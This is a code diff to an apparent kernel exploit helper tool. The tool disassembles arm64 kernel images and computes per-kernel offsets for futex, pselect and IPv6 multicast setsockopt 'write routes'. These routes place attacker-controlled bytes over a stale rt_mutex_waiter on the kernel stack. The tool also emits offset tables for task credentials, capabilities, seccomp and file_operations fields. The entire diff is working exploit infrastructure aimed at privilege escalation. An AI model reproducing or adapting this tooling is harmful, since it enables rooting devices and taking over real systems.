+                    window_index for window_index, window_line
+                    in enumerate(lines[index:index + 14])
+                    if re.search(
+                        r"\badrp\s+x\d+,\s*0x[0-9a-f]+\b",
+                        window_line, re.I,
+                    )
+                ),
+                None,
+            )
+            if adrp_line is None:
+                continue
+            rewritten = False
+            for between in lines[index + 2:index + adrp_line]:
+                if re.search(
+                    rf"\b[a-z]+(?:\.[a-z0-9]+)?\s+[wx]{index_reg}\s*,",
+                    between, re.I,
+                ):
+                    rewritten = True
+                    break
+            if rewritten:
+                continue
+            table = (int(table_page.group(1), 16) & ~0xFFF) + int(
+                table_add.group(1), 16
+            )
+            base = int(adr_base.group(1), 16)
+            switch = {"table": table, "base": base, "max": max_value}
+            break
+    if switch is None:
+        raise ExtractError(
+            "cannot locate the optname switch in do_ipv6_setsockopt"
+        )
+    table, base, max_value = (
+        switch["table"], switch["base"], switch["max"]
+    )
+    if table + 4 * (max_value + 1) > len(kernel):
+        raise ExtractError(
+            f"switch table 0x{table:x} exceeds kernel image"
+        )
+    cases = [
+        base + _u32(kernel, table + 4 * index)
+        for index in range(max_value + 1)
+    ]
+    best: tuple[int, int, int] | None = None
+    for copy_off, site_addr in sites:
+        for index, case_addr in enumerate(cases):
+            # The switch case lands at the case block entry (often a `bti j`
+            # immediately before the `add x0, sp, #off` / `mov wN, #0x108`
+            # sequence), so accept a small window around the copy site.
+            if abs(case_addr - site_addr) > 16:
+                continue
+            # Several optnames may share one handler (vendors often alias
+            # adjacent values into the same case), so keep scanning for the
+            # exact optname-46 slot instead of settling on the first hit.
+            if index == MCAST_SWITCH_INDEX:
+                best = (index, copy_off, site_addr)
+                break
+            if best is None:
+                best = (index, copy_off, site_addr)
+    if best is None:
+        raise ExtractError(
+            "no 264-byte copy site maps to an optname switch case "
+            f"(sites={[(hex(off), hex(addr)) for off, addr in sites]})"
+        )
+    index, copy_off, site_addr = best
+    if index != MCAST_SWITCH_INDEX:
+        print(
+            f"warning: mcast 264-byte copy is switch case {index}, "
+            f"expected {MCAST_SWITCH_INDEX} for optname "
+            f"{MCAST_ROUTE_OPTNAME}",
+            file=sys.stderr,
+        )
+    return {"index": index, "copy_off": copy_off, "site_addr": site_addr}
+
+
+def derive_mcast_layout(
+    tool: str,
+    kernel_path: Path,
+    kernel: bytes,
+    symbols: dict[str, set[int]],
+    sorted_offsets: list[int],
+    btf: Btf | None,
+) -> dict[str, object]:
+    """Derive the IPv6 mcast 264-byte route: the setsockopt stack copy must
+    fully cover the futex waiter. Returns mcast_payload_off (waiter offset
+    inside the 264-byte buffer) or raises InfeasibleError."""
+    futex = derive_futex_chain(
+        tool, kernel_path, symbols, sorted_offsets, btf, kernel,
+    )
+    sock = derive_setsockopt_chain(
+        tool, kernel_path, symbols, sorted_offsets, btf, kernel,
+    )
+    do_text = sock["dis"]["do_ipv6_setsockopt"]
+    sites = _find_mcast_copy_sites(do_text)
+    if not sites:
+        raise ExtractError(
+            "no 264-byte stack copy in do_ipv6_setsockopt"
+        )
+    case = _resolve_mcast_case(kernel, do_text, sites)
+    copy_abs = -sock["frame_sum"] + case["copy_off"]
+    waiter_abs = int(futex["waiter_abs"])
+    payload = waiter_abs - copy_abs
+    waiter_size = btf.size("rt_mutex_waiter") if btf is not None else None
+    if waiter_size is None:
+        waiter_size = 0x58
+    problems: list[str] = []
+    if payload < 0 or payload + waiter_size > MCAST_COPY_LEN:
+        problems.append(
+            f"waiter 0x{payload:x}..0x{payload + waiter_size:x} is not "
+            f"fully inside the {MCAST_COPY_LEN:#x}-byte copy"
+        )
+    if payload % 8:
+        problems.append("waiter offset is not 8-byte aligned")
+    if problems:
+        raise InfeasibleError("; ".join(problems))
+    return {
+        "mcast_payload_off": payload,
+        "copy_off": case["copy_off"],
+        "copy_abs": copy_abs,
+        "waiter_abs": waiter_abs,
+        "waiter_size": waiter_size,
+        "case_index": case["index"],
+        "chain": sock["chain"],
+        "frames": sock["frames"],
+        "futex": futex,
     }
 
 
@@ -1189,7 +2127,15 @@ def resolve_structs(btf: Btf | None) -> dict[str, int | None]:
                 result[macro] = None
             continue
         for macro, field_name in fields.items():
-            result[macro] = btf.field(struct_name, field_name)
+            if isinstance(field_name, tuple):
+                value = None
+                for btf_name in field_name:
+                    value = btf.field(struct_name, btf_name)
+                    if value is not None:
+                        break
+                result[macro] = value
+            else:
+                result[macro] = btf.field(struct_name, field_name)
     for macro, struct_name in (
         ("struct_page_size", "page"),
     ):
@@ -1199,7 +2145,11 @@ def resolve_structs(btf: Btf | None) -> dict[str, int | None]:
         ("struct_page_type", "page_type"),
     ):
         result[macro] = btf.field("page", field_name)
-    result["struct_slab_cache"] = btf.field("slab", "slab_cache")
+    # 6.8+ splits struct slab out of struct page; 5.15 keeps the
+    # slab_cache backpointer in struct page's slab union.
+    result["struct_slab_cache"] = (
+        btf.field("slab", "slab_cache") or btf.field("page", "slab_cache")
+    )
     result["struct_mm_struct"] = btf.size("mm_struct")
     return result
 
@@ -1263,12 +2213,15 @@ def kernel_header_path(key: str) -> Path:
 
 
 def kernel_struct_macro(release: str | None) -> str:
-    """STRUCT_OFFSETS_6_12 for 6.12+ kernels, STRUCT_OFFSETS_6_6 otherwise."""
+    """STRUCT_OFFSETS_6_12 for 6.12+, STRUCT_OFFSETS_6_6 for 6.x,
+    STRUCT_OFFSETS_5_15 for older kernels."""
     if release:
         match = re.match(r"^(\d+)\.(\d+)", release)
         if match and tuple(map(int, match.groups())) >= (6, 12):
             return "STRUCT_OFFSETS_6_12"
-    return "STRUCT_OFFSETS_6_6"
+        if match and tuple(map(int, match.groups())) >= (6, 0):
+            return "STRUCT_OFFSETS_6_6"
+    return "STRUCT_OFFSETS_5_15"
 
 
 def pselect_waiter_shift_for(release: str | None) -> int:
@@ -1278,37 +2231,88 @@ def pselect_waiter_shift_for(release: str | None) -> int:
     return 0 if kernel_struct_macro(release) == "STRUCT_OFFSETS_6_12" else -2
 
 
+# Struct fields mirrored by struct kernel_offsets in src/kernels/offsets.h;
+# seccomp/configfs_buffer have no runtime overrides and are kept in
+# STRUCT_FIELDS only for reference.
+KERNEL_OFFSETS_FIELDS = (
+    "task_prio", "task_normal_prio", "task_sched_task_group", "task_pi_lock",
+    "task_pi_waiters", "task_pi_top_task", "task_pi_blocked_on", "task_pid",
+    "task_tgid", "task_atomic_flags", "task_real_cred", "task_cred",
+    "task_comm", "task_tasks", "task_seccomp",
+    "waiter_tree", "waiter_tree_prio", "waiter_tree_deadline",
+    "waiter_pi_tree", "waiter_pi_tree_prio", "waiter_pi_tree_deadline",
+    "waiter_task", "waiter_lock", "waiter_wake_state", "waiter_ww_ctx",
+    "cred_uid", "cred_securebits", "cred_caps", "cred_security",
+    "fops_llseek", "fops_read", "fops_write", "fops_read_iter",
+    "fops_write_iter", "fops_ioctl", "fops_compat_ioctl", "fops_mmap",
+    "fops_open", "fops_release", "fops_splice_read", "fops_show_fdinfo",
+    "struct_page_size", "struct_page_compound_head", "struct_page_type",
+    "struct_slab_cache", "struct_mm_struct",
+)
+
+
+def struct_macro_defaults(macro: str) -> dict[str, int]:
+    """Field values carried by a STRUCT_OFFSETS_* macro; single source of
+    truth is src/kernels/offsets.h."""
+    header = (KERNEL_ROOT / "offsets.h").read_text(
+        encoding="utf-8", errors="replace"
+    )
+    match = re.search(
+        rf"#define\s+{re.escape(macro)}\s+(.*?)(?=\n\s*\n)",
+        header,
+        re.S,
+    )
+    if not match:
+        return {}
+    return {
+        name: int(value, 0)
+        for name, value in re.findall(
+            r"\.([A-Za-z0-9_]+)\s*=\s*(0x[0-9A-Fa-f]+|-?\d+)", match.group(1)
+        )
+    }
+
+
 def render_device(
     release: str | None,
     symbols: dict[str, int | None],
     structs: dict[str, int | None],
     phys: int | None,
     pselect_shift: int,
+    mcast_payload_off: int = 0,
 ) -> str:
+    macro = kernel_struct_macro(release)
+    defaults = struct_macro_defaults(macro)
+    struct_values = {
+        key: value for key, value in (
+            (key, structs.get(key)) for key in KERNEL_OFFSETS_FIELDS
+        ) if value is not None
+    }
+    deviations = {
+        key: value for key, value in struct_values.items()
+        if defaults.get(key) != value
+    }
     lines = [f"/* {release} */", ""]
     lines.append("OFFSETS_ENTRY(")
     lines.append(f'    "{release}",')
-    lines.append(f"    {kernel_struct_macro(release)},")
+    if deviations:
+        # Family macro cannot express this layout; emit every known field
+        # explicitly instead of mixing two initializers for the same field.
+        for key in KERNEL_OFFSETS_FIELDS:
+            value = struct_values.get(key)
+            if value is not None:
+                lines.append(f"    .{key} = 0x{value:x},")
+    else:
+        lines.append(f"    {macro},")
     if phys is not None:
         lines.append(f"    .kernel_phys_load = 0x{phys:x},")
     lines.append(f"    .pselect_waiter_shift = {pselect_shift},")
+    if mcast_payload_off:
+        lines.append(f"    .mcast_payload_off = 0x{mcast_payload_off:x},")
     for key, value in symbols.items():
         if value is None:
             continue
         lines.append(f"    .{key} = 0x{value:08x},")
     lines.append("),")
-    reference = {
-        key: value for key, value in structs.items()
-        if value is not None and (
-            key.startswith("struct_page")
-            or key in ("struct_slab_cache", "struct_mm_struct")
-        )
-    }
-    if reference:
-        lines.append("")
-        lines.append("/* BTF reference (runtime uses target.h defaults): */")
-        for key, value in reference.items():
-            lines.append(f"/* #define {key.upper()} 0x{value:X} */")
     return "\n".join(lines) + "\n"
 
 
@@ -1370,7 +2374,7 @@ def register_kernel(key: str) -> Path:
     return header
 
 
-def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[str, int | None], phys: int | None, name: str, pselect_shift: int) -> str:
+def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[str, int | None], phys: int | None, name: str, pselect_shift: int, mcast_payload_off: int = 0) -> str:
     lines = [f"/* Generated offsets for {release or name}. */", ""]
     lines.append("#define STRUCT_OFFSETS_EXTRACTED \\")
     task_keys = (
@@ -1389,6 +2393,8 @@ def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[
     if phys is not None:
         lines.append(f"  .kernel_phys_load=0x{phys:X},")
     lines.append(f"  .pselect_waiter_shift={pselect_shift},")
+    if mcast_payload_off:
+        lines.append(f"  .mcast_payload_off=0x{mcast_payload_off:X},")
     for key, value in symbols.items():
         if value is not None:
             lines.append(f"  .{key}=0x{value:08X},")
@@ -1461,6 +2467,12 @@ def main(argv: list[str] | None = None) -> int:
         help="treat every unresolved symbol as optional (emit 0)",
     )
     parser.add_argument(
+        "--check-route",
+        action="store_true",
+        help="derive and report the futex/pselect/mcast route geometry, "
+        "then exit (no table output)",
+    )
+    parser.add_argument(
         "--force",
         action="store_true",
         help="overwrite an existing device header that differs",
@@ -1518,6 +2530,8 @@ def main(argv: list[str] | None = None) -> int:
                     file=sys.stderr,
                 )
         derived: dict[str, int] = {}
+        pselect_error: str | None = None
+        mcast_error: str | None = None
         objdump = find_llvm_objdump(args.llvm_objdump)
         if objdump is None:
             print(
@@ -1531,20 +2545,23 @@ def main(argv: list[str] | None = None) -> int:
                 kernel_path = Path(tmp) / "kernel.bin"
                 kernel_path.write_bytes(boot.kernel)
                 rel_symbols, sorted_offsets = relative_symbols(symbols, base)
+                pselect = None
+                pselect_error = None
                 try:
                     pselect = derive_pselect_layout(
                         objdump, kernel_path, rel_symbols, sorted_offsets,
                         btf, PSELECT_ROUTE_NFDS,
                     )
                 except InfeasibleError as exc:
+                    pselect_error = f"pselect route not feasible: {exc}"
                     print(
-                        f"error: pselect route not feasible on this kernel: {exc}",
+                        f"warning: {pselect_error}",
                         file=sys.stderr,
                     )
-                    return 2
                 except ExtractError as exc:
+                    pselect_error = f"pselect_waiter_shift derivation failed: {exc}"
                     print(
-                        f"warning: pselect_waiter_shift derivation failed: {exc}",
+                        f"warning: {pselect_error}",
                         file=sys.stderr,
                     )
                 else:
@@ -1568,6 +2585,90 @@ def main(argv: list[str] | None = None) -> int:
                         f"(derived {pselect['PSELECT_WAITER_WORD_SHIFT']} - 2)",
                         file=sys.stderr,
                     )
+                mcast = None
+                mcast_error = None
+                try:
+                    mcast = derive_mcast_layout(
+                        objdump, kernel_path, boot.kernel,
+                        rel_symbols, sorted_offsets, btf,
+                    )
+                except (InfeasibleError, ExtractError) as exc:
+                    mcast_error = f"mcast route derivation failed: {exc}"
+                    print(
+                        f"warning: {mcast_error}",
+                        file=sys.stderr,
+                    )
+                else:
+                    derived["mcast_payload_off"] = mcast["mcast_payload_off"]
+                    futex_info = mcast["futex"]
+                    frame_parts = " ".join(
+                        f"{key}=0x{value:x}"
+                        for key, value in mcast["frames"].items()
+                    )
+                    print(
+                        f"info: mcast chain {mcast['chain']} frames={frame_parts} "
+                        f"copy=0x{mcast['copy_off']:x} "
+                        f"waiter=0x{futex_info['waiter_local']:x} "
+                        f"payload=0x{mcast['mcast_payload_off']:x} "
+                        f"case={mcast['case_index']}",
+                        file=sys.stderr,
+                    )
+                if args.check_route:
+                    print("== futex chain ==")
+                    try:
+                        futex_info = derive_futex_chain(
+                            objdump, kernel_path, rel_symbols,
+                            sorted_offsets, btf, boot.kernel,
+                        )
+                        print(f"chain: {futex_info['chain']}")
+                        print(
+                            "frames: "
+                            + " ".join(
+                                f"{key}=0x{value:x}"
+                                for key, value in futex_info["frames"].items()
+                            )
+                        )
+                        print(
+                            "waiter: sp+0x%x abs=0x%x"
+                            % (
+                                futex_info["waiter_local"],
+                                futex_info["waiter_abs"],
+                            )
+                        )
+                    except ExtractError as exc:
+                        print(f"failed: {exc}")
+                    print("== pselect route ==")
+                    if pselect is not None:
+                        print(
+                            "feasible: shift=%d buffer=0x%x waiter=0x%x "
+                            "chain=%s"
+                            % (
+                                pselect["PSELECT_WAITER_WORD_SHIFT"],
+                                pselect["pselect_buffer"],
+                                pselect["waiter_local"],
+                                pselect["chain"],
+                            )
+                        )
+                    else:
+                        print(f"infeasible: {pselect_error}")
+                    print("== mcast route ==")
+                    if mcast is not None:
+                        print(
+                            "feasible: payload=0x%x copy=0x%x waiter=0x%x "
+                            "case=%d chain=%s"
+                            % (
+                                mcast["mcast_payload_off"],
+                                mcast["copy_off"],
+                                mcast["waiter_abs"],
+                                mcast["case_index"],
+                                mcast["chain"],
+                            )
+                        )
+                    else:
+                        print(f"infeasible: {mcast_error}")
+                    if pselect is None and mcast is None:
+                        return 2
+                    return 0
                 if btf is None:
                     print(
                         "warning: no BTF; loggers_0_1 falls back to the "
@@ -1597,6 +2698,17 @@ def main(argv: list[str] | None = None) -> int:
         pselect_shift = derived.get(
             "pselect_waiter_shift", pselect_waiter_shift_for(boot.release())
         )
+        mcast_payload_off = derived.get("mcast_payload_off", 0)
+        if (
+            pselect_error is not None
+            and pselect_error.startswith("pselect route not feasible")
+            and not mcast_payload_off
+        ):
+            print(
+                f"error: no feasible write route on this kernel: {pselect_error}",
+                file=sys.stderr,
+            )
+            return 2
         if "pselect_waiter_shift" not in derived:
             print(
                 f"warning: using heuristic pselect_waiter_shift={pselect_shift} "
@@ -1649,6 +2761,8 @@ def main(argv: list[str] | None = None) -> int:
             "kernel_phys_load": args.kernel_phys_load,
             "symbols": symbol_offsets,
             "struct_fields": struct_offsets,
+            "pselect_waiter_shift": pselect_shift,
+            "mcast_payload_off": mcast_payload_off,
             "btf_size": len(btf_raw) if btf_raw is not None else 0,
         }
         if args.register:
@@ -1666,7 +2780,7 @@ def main(argv: list[str] | None = None) -> int:
                     return 0
             output = render_device(
                 release, symbol_offsets, struct_offsets,
-                args.kernel_phys_load, pselect_shift,
+                args.kernel_phys_load, pselect_shift, mcast_payload_off,
             )
             target = kernel_header_path(key)
             if (
@@ -1688,6 +2802,7 @@ def main(argv: list[str] | None = None) -> int:
             output = render_c(
                 boot.release(), symbol_offsets, struct_offsets,
                 args.kernel_phys_load, args.name, pselect_shift,
+                mcast_payload_off,
             )
         else:
             output = json.dumps(report, indent=2, sort_keys=True) + "\n"
